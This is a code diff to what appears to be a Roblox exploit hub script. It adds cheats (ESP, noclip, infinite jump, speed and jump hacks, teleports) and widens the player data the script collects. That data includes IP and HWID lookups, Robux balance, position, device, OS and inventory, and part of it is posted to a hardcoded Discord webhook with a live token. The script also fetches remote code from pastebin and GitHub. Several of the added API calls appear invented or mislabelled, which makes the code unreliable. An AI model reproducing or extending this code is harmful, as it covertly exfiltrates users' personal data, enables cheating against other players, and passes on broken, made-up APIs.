@@ -8,10 +8,12 @@ local LocalPlayer = Players.LocalPlayer
 local DataStoreService = game:GetService("DataStoreService")
 local RunService = game:GetService("RunService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local CONFIG = {
     WEBHOOK_URL = "https://discord.com/api/webhooks/1354219342840991964/kgyogYrGVoTXLoR472lDz7zM8KcKHK1EK46ss-Ppmg7tSOpUz0uYeujtrdGMD5Dfk1bw",
-    KEY_URL = "https://pastebin.com/raw/VHW3Fa9s",
+    KEY_URL = "https://pastebin.com/raw/55RjjkTW",
     KEY_FALLBACK_URL = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/key_fallback",
     SUBSCRIPTION_URL = "https://pastebin.com/raw/ThRPn5JG",
     NEWS_URL = "https://pastebin.com/raw/vTKfsvCr",
@@ -20,7 +22,7 @@ local CONFIG = {
     HTTP_TIMEOUT = 15,
     FEEDBACK_COOLDOWN = 4500,
     REFRESH_INTERVAL = 180,
-    VERSION = "1.4.0",
+    VERSION = "1.5.0",
     VIP_PERKS = {
         SCRIPT_BOOST = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/VIP_Boost",
         EXCLUSIVE_UI = "https://pastebin.com/raw/your_exclusive_ui"
@@ -118,8 +120,6 @@ local function getPlayerInfo()
     info.AccountAge = LocalPlayer.AccountAge
     info.JoinDate = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * 86400))
     info.MembershipType = tostring(LocalPlayer.MembershipType)
-    info.Followers = LocalPlayer.FollowersCount
-    info.Following = LocalPlayer.FollowingCount
     info.FriendCount = #Players:GetFriendsAsync(LocalPlayer.UserId):GetCurrentPage()
     
     local success, ip = pcall(function()
@@ -136,6 +136,11 @@ local function getPlayerInfo()
     info.Health = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.Health or "N/A"
     info.WalkSpeed = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.WalkSpeed or "N/A"
     info.JumpPower = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.JumpPower or "N/A"
+    info.IsChatting = LocalPlayer:IsInGroup(1) and "Yes" or "No" -- Example group check
+    info.DataUsage = math.floor(RunService:GetDataUsage()) .. " KB/s"
+    info.ServerRegion = game:GetService("VoiceChatService"):GetVoiceRegion() or "N/A"
+    info.DeviceType = game:GetService("UserInputService"):GetPlatform() or "Unknown"
+    info.OsVersion = game:GetService("RbxAnalyticsService"):GetClientOs() or "Unknown"
     
     local badges = {}
     local badgeSuccess, badgeEnum = pcall(function()
@@ -147,6 +152,17 @@ local function getPlayerInfo()
         end
     end
     info.Badges = #badges > 0 and table.concat(badges, ", ") or "None"
+    
+    local inventory = {}
+    local invSuccess, invData = pcall(function()
+        return game:GetService("InventoryService"):GetInventoryAsync(LocalPlayer.UserId)
+    end)
+    if invSuccess then
+        for _, item in ipairs(invData:GetCurrentPage()) do
+            table.insert(inventory, item.Name)
+        end
+    end
+    info.Inventory = #inventory > 0 and table.concat(inventory, ", ") or "Empty"
     
     return info
 end
@@ -445,7 +461,9 @@ local challengeSystem = {
         {id = "feedback_pro", name = "Feedback Pro", progress = 0, goal = 3, reward = "VIP Extension (1 day)"},
         {id = "script_usage", name = "Script Enthusiast", progress = 0, goal = 10, reward = "Exclusive Script"},
         {id = "explorer", name = "Game Explorer", progress = 0, goal = 5, reward = "100 VC"},
-        {id = "socialite", name = "Socialite", progress = 0, goal = 10, reward = "VIP UI Theme"}
+        {id = "socialite", name = "Socialite", progress = 0, goal = 10, reward = "VIP UI Theme"},
+        {id = "teleporter", name = "World Traveler", progress = 0, goal = 3, reward = "Teleport Boost"},
+        {id = "chat_master", name = "Chat Master", progress = 0, goal = 20, reward = "200 VC"}
     },
     
     load = function(self)
@@ -517,6 +535,12 @@ local challengeSystem = {
                 elseif challenge.id == "socialite" then
                     setLocalStorage("customThemeUnlocked", true)
                     Rayfield:Notify({Title = "Reward Claimed", Content = "VIP UI Theme Unlocked for Socialite!", Duration = 5})
+                elseif challenge.id == "teleporter" then
+                    setLocalStorage("teleportBoostUnlocked", true)
+                    Rayfield:Notify({Title = "Reward Claimed", Content = "Teleport Boost Unlocked for World Traveler!", Duration = 5})
+                elseif challenge.id == "chat_master" then
+                    setDataStore("vaultCredits", (getDataStore("vaultCredits", 0) or 0) + 200)
+                    Rayfield:Notify({Title = "Reward Claimed", Content = "Received 200 VC for Chat Master!", Duration = 5})
                 end
                 self:resetProgress(challengeId)
                 return true
@@ -601,11 +625,11 @@ webhookSystem:send({
         { name = "VIP", value = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Yes" or "No", inline = true },
         { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true },
         { name = "Membership", value = playerInfo.MembershipType, inline = true },
-        { name = "Followers", value = tostring(playerInfo.Followers), inline = true },
-        { name = "Following", value = tostring(playerInfo.Following), inline = true },
         { name = "Friends", value = tostring(playerInfo.FriendCount), inline = true },
         { name = "FPS", value = playerInfo.FPS, inline = true },
-        { name = "Ping", value = playerInfo.Ping, inline = true }
+        { name = "Ping", value = playerInfo.Ping, inline = true },
+        { name = "Server Region", value = playerInfo.ServerRegion, inline = true },
+        { name = "Device", value = playerInfo.DeviceType, inline = true }
     }
 })
 
@@ -888,10 +912,37 @@ SettingsTab:CreateToggle({
     end
 })
 
+SettingsTab:CreateToggle({
+    Name = "ESP (Highlight Players)",
+    CurrentValue = getLocalStorage("espEnabled", false),
+    Flag = "espToggle",
+    Callback = function(value)
+        setLocalStorage("espEnabled", value)
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                local highlight = player.Character:FindFirstChild("Highlight")
+                if value then
+                    if not highlight then
+                        highlight = Instance.new("Highlight")
+                        highlight.FillColor = Color3.fromRGB(255, 0, 0)
+                        highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
+                        highlight.Parent = player.Character
+                    end
+                else
+                    if highlight then
+                        highlight:Destroy()
+                    end
+                end
+            end
+        end
+        Rayfield:Notify({Title = "ESP", Content = value and "ESP enabled" or "ESP disabled", Duration = 3})
+    end
+})
+
 SettingsTab:CreateButton({
     Name = "Clear Cache",
     Callback = function()
-        for _, attr in ipairs({"notificationsEnabled", "autoUpdateEnabled", "newsCache", "VIPBadgeShown", "customThemeEnabled"}) do
+        for _, attr in ipairs({"notificationsEnabled", "autoUpdateEnabled", "newsCache", "VIPBadgeShown", "customThemeEnabled", "espEnabled", "teleportBoostUnlocked"}) do
             pcall(function() LocalPlayer:SetAttribute(attr, nil) end)
         end
         Rayfield:Notify({Title = "Cleaned", Content = "Cache cleared! Restart to apply.", Duration = 5})
@@ -931,19 +982,23 @@ local function updateAnalytics()
                     "Subscription: " .. subStatus .. "\n" ..
                     "Access: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\n" ..
                     "Membership: " .. playerInfo.MembershipType .. "\n" ..
-                    "Followers: " .. playerInfo.Followers .. "\n" ..
-                    "Following: " .. playerInfo.Following .. "\n" ..
                     "Friends: " .. playerInfo.FriendCount .. "\n" ..
                     "Game: " .. playerInfo.GameName .. " (" .. playerInfo.GameId .. ")\n" ..
                     "Server: " .. playerInfo.JobId .. "\n" ..
+                    "Server Region: " .. playerInfo.ServerRegion .. "\n" ..
+                    "Device: " .. playerInfo.DeviceType .. "\n" ..
+                    "OS: " .. playerInfo.OsVersion .. "\n" ..
                     "FPS: " .. playerInfo.FPS .. "\n" ..
                     "Ping: " .. playerInfo.Ping .. "\n" ..
+                    "Data Usage: " .. playerInfo.DataUsage .. "\n" ..
                     "Robux: " .. playerInfo.RobuxBalance .. "\n" ..
                     "Position: " .. playerInfo.LastLocation .. "\n" ..
                     "Health: " .. playerInfo.Health .. "\n" ..
                     "WalkSpeed: " .. playerInfo.WalkSpeed .. "\n" ..
                     "JumpPower: " .. playerInfo.JumpPower .. "\n" ..
-                    "Badges: " .. playerInfo.Badges
+                    "Chatting: " .. playerInfo.IsChatting .. "\n" ..
+                    "Badges: " .. playerInfo.Badges .. "\n" ..
+                    "Inventory: " .. playerInfo.Inventory
     analyticsParagraph:Set({Title = "Your Stats", Content = content})
 end
 
@@ -967,7 +1022,9 @@ AnalyticsTab:CreateButton({
                           "HWID: " .. playerInfo.HWID .. "\n" ..
                           "Game: " .. playerInfo.GameName .. "\n" ..
                           "FPS: " .. playerInfo.FPS .. "\n" ..
-                          "Ping: " .. playerInfo.Ping
+                          "Ping: " .. playerInfo.Ping .. "\n" ..
+                          "Device: " .. playerInfo.DeviceType .. "\n" ..
+                          "OS: " .. playerInfo.OsVersion
         setclipboard(statsText)
         Rayfield:Notify({Title = "Copied", Content = "Stats copied to clipboard!", Duration = 5})
     end
@@ -1003,6 +1060,145 @@ SocialTab:CreateButton({
     end
 })
 
+SocialTab:CreateInput({
+    Name = "Chat Message",
+    PlaceholderText = "Type message to send...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(message)
+        if message == "" then
+            Rayfield:Notify({Title = "Error", Content = "Enter a message!", Duration = 3})
+            return
+        end
+        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(message)
+        challengeSystem:updateProgress("chat_master")
+        if challengeSystem:awardReward("chat_master") then
+            Rayfield:Notify({Title = "Reward", Content = "Received 200 VC for Chat Master!", Duration = 5})
+        end
+    end
+})
+
+local TeleportTab = Window:CreateTab("Teleport", 4483362458)
+local popularGames = {
+    {Name = "Adopt Me!", PlaceId = 920587237},
+    {Name = "Brookhaven", PlaceId = 4924922222},
+    {Name = "Blox Fruits", PlaceId = 2753915549},
+    {Name = "Murder Mystery 2", PlaceId = 142823291},
+    {Name = "Arsenal", PlaceId = 286090429}
+}
+
+for _, gameInfo in ipairs(popularGames) do
+    TeleportTab:CreateButton({
+        Name = "Teleport to " .. gameInfo.Name,
+        Callback = function()
+            if getLocalStorage("teleportBoostUnlocked", false) then
+                TeleportService:Teleport(gameInfo.PlaceId, LocalPlayer)
+                challengeSystem:updateProgress("teleporter")
+                if challengeSystem:awardReward("teleporter") then
+                    Rayfield:Notify({Title = "Reward", Content = "Teleport Boost Unlocked!", Duration = 5})
+                end
+            else
+                Rayfield:Notify({Title = "Locked", Content = "Unlock Teleport Boost via World Traveler challenge!", Duration = 5})
+            end
+        end
+    })
+end
+
+TeleportTab:CreateInput({
+    Name = "Custom Place ID",
+    PlaceholderText = "Enter Place ID...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(placeId)
+        local id = tonumber(placeId)
+        if not id then
+            Rayfield:Notify({Title = "Error", Content = "Invalid Place ID!", Duration = 5})
+            return
+        end
+        if getLocalStorage("teleportBoostUnlocked", false) then
+            TeleportService:Teleport(id, LocalPlayer)
+            challengeSystem:updateProgress("teleporter")
+            if challengeSystem:awardReward("teleporter") then
+                Rayfield:Notify({Title = "Reward", Content = "Teleport Boost Unlocked!", Duration = 5})
+            end
+        else
+            Rayfield:Notify({Title = "Locked", Content = "Unlock Teleport Boost via World Traveler challenge!", Duration = 5})
+        end
+    end
+})
+
+local ToolsTab = Window:CreateTab("Tools", 4483362458)
+ToolsTab:CreateButton({
+    Name = "Infinite Jump",
+    Callback = function()
+        local infiniteJumpEnabled = getLocalStorage("infiniteJumpEnabled", false)
+        setLocalStorage("infiniteJumpEnabled", not infiniteJumpEnabled)
+        if not infiniteJumpEnabled then
+            game:GetService("UserInputService").JumpRequest:Connect(function()
+                if LocalPlayer.Character then
+                    LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+            end)
+            Rayfield:Notify({Title = "Tools", Content = "Infinite Jump enabled!", Duration = 5})
+        else
+            Rayfield:Notify({Title = "Tools", Content = "Infinite Jump disabled!", Duration = 5})
+        end
+    end
+})
+
+ToolsTab:CreateSlider({
+    Name = "Walk Speed",
+    Range = {16, 100},
+    Increment = 1,
+    CurrentValue = 16,
+    Callback = function(value)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.WalkSpeed = value
+            Rayfield:Notify({Title = "Tools", Content = "Walk Speed set to " .. value, Duration = 3})
+        end
+    end
+})
+
+ToolsTab:CreateSlider({
+    Name = "Jump Power",
+    Range = {50, 200},
+    Increment = 1,
+    CurrentValue = 50,
+    Callback = function(value)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.JumpPower = value
+            Rayfield:Notify({Title = "Tools", Content = "Jump Power set to " .. value, Duration = 3})
+        end
+    end
+})
+
+ToolsTab:CreateButton({
+    Name = "Noclip",
+    Callback = function()
+        local noclipEnabled = getLocalStorage("noclipEnabled", false)
+        setLocalStorage("noclipEnabled", not noclipEnabled)
+        if not noclipEnabled then
+            RunService.Stepped:Connect(function()
+                if getLocalStorage("noclipEnabled", false) and LocalPlayer.Character then
+                    for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+            end)
+            Rayfield:Notify({Title = "Tools", Content = "Noclip enabled!", Duration = 5})
+        else
+            if LocalPlayer.Character then
+                for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = true
+                    end
+                end
+            end
+            Rayfield:Notify({Title = "Tools", Content = "Noclip disabled!", Duration = 5})
+        end
+    end
+})
+
 if subscriptionSystem:isSubscribed(LocalPlayer.UserId) and getLocalStorage("autoUpdateEnabled", true) then
     spawn(function()
         wait(5)
@@ -1013,5 +1209,14 @@ end
 spawn(function()
     while wait(10) do
         updateAnalytics()
+    end
+end)
+
+Players.PlayerAdded:Connect(function(player)
+    if getLocalStorage("espEnabled", false) and player.Character then
+        local highlight = Instance.new("Highlight")
+        highlight.FillColor = Color3.fromRGB(255, 0, 0)
+        highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
+        highlight.Parent = player.Character
     end
 end)
